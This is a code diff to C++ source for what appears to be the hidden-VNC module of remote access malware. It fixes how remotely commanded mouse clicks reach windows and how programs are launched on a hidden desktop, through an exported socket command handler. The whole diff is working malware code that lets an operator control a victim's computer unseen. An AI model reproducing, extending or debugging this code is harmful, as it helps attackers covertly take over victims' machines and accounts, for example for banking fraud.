@@ -352,44 +352,39 @@ static void input_loop() {
                 WPARAM wParam = 0;
 
                 if (task.action == "hvnc_mousedown") {
-                    SetForegroundWindow(hwnd);
+                    HWND hRoot = GetAncestor(hwnd, GA_ROOT);
+                    SendMessageW(hRoot, WM_MOUSEACTIVATE, (WPARAM)hRoot, MAKELPARAM(hitTest, WM_LBUTTONDOWN));
+                    SendMessageW(hRoot, WM_ACTIVATE, WA_CLICKACTIVE, (LPARAM)hRoot);
+                    SetForegroundWindow(hRoot);
                     SetFocus(hwnd);
 
                     if (hitTest != HTCLIENT) {
                         msg = (btn == 0) ? WM_NCLBUTTONDOWN : (btn == 1 ? WM_NCRBUTTONDOWN : WM_NCMBUTTONDOWN);
                         wParam = hitTest;
+                        PostMessageW(hwnd, msg, wParam, MAKELPARAM(x, y));
                     } else {
                         HWND hChild = ChildWindowFromPointEx(hwnd, pt, CWP_SKIPINVISIBLE);
-                        if (hChild && hChild != hwnd) {
-                            hwnd = hChild;
-                            POINT clientPt = pt;
-                            ScreenToClient(hwnd, &clientPt);
-                            msg = (btn == 0) ? WM_LBUTTONDOWN : (btn == 1 ? WM_RBUTTONDOWN : WM_MBUTTONDOWN);
-                            wParam = (btn == 0) ? MK_LBUTTON : (btn == 1 ? MK_RBUTTON : MK_MBUTTON);
-                            PostMessageW(hwnd, msg, wParam, MAKELPARAM(clientPt.x, clientPt.y));
-                            continue;
-                        }
+                        if (hChild && hChild != hwnd) hwnd = hChild;
+                        POINT clientPt = pt;
+                        ScreenToClient(hwnd, &clientPt);
                         msg = (btn == 0) ? WM_LBUTTONDOWN : (btn == 1 ? WM_RBUTTONDOWN : WM_MBUTTONDOWN);
                         wParam = (btn == 0) ? MK_LBUTTON : (btn == 1 ? MK_RBUTTON : MK_MBUTTON);
+                        PostMessageW(hwnd, msg, wParam, MAKELPARAM(clientPt.x, clientPt.y));
                     }
                 } else {
                     if (hitTest != HTCLIENT) {
                         msg = (btn == 0) ? WM_NCLBUTTONUP : (btn == 1 ? WM_NCRBUTTONUP : WM_NCMBUTTONUP);
                         wParam = hitTest;
+                        PostMessageW(hwnd, msg, wParam, MAKELPARAM(x, y));
                     } else {
                         HWND hChild = ChildWindowFromPointEx(hwnd, pt, CWP_SKIPINVISIBLE);
-                        if (hChild && hChild != hwnd) {
-                            hwnd = hChild;
-                            POINT clientPt = pt;
-                            ScreenToClient(hwnd, &clientPt);
-                            msg = (btn == 0) ? WM_LBUTTONUP : (btn == 1 ? WM_RBUTTONUP : WM_MBUTTONUP);
-                            PostMessageW(hwnd, msg, 0, MAKELPARAM(clientPt.x, clientPt.y));
-                            continue;
-                        }
+                        if (hChild && hChild != hwnd) hwnd = hChild;
+                        POINT clientPt = pt;
+                        ScreenToClient(hwnd, &clientPt);
                         msg = (btn == 0) ? WM_LBUTTONUP : (btn == 1 ? WM_RBUTTONUP : WM_MBUTTONUP);
+                        PostMessageW(hwnd, msg, 0, MAKELPARAM(clientPt.x, clientPt.y));
                     }
                 }
-                PostMessageW(hwnd, msg, wParam, MAKELPARAM(x, y));
             }
         } else if (task.action.find("hvnc_key") != string::npos) {
             int vk = task.cmd.value("keycode", 0);
@@ -456,13 +451,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             vector<wchar_t> cmdLine(path.begin(), path.end());
             cmdLine.push_back(L'\0');
 
-            wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
             STARTUPINFOW si = { sizeof(si) };
-            si.lpDesktop = (LPWSTR)fullDesktopName.c_str();
+            si.lpDesktop = (LPWSTR)g_desktopName.c_str();
             si.dwFlags = STARTF_USESHOWWINDOW;
             si.wShowWindow = SW_SHOW;
 
             PROCESS_INFORMATION pi = { 0 };
+            SetThreadDesktop(g_hHiddenDesktop);
             if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
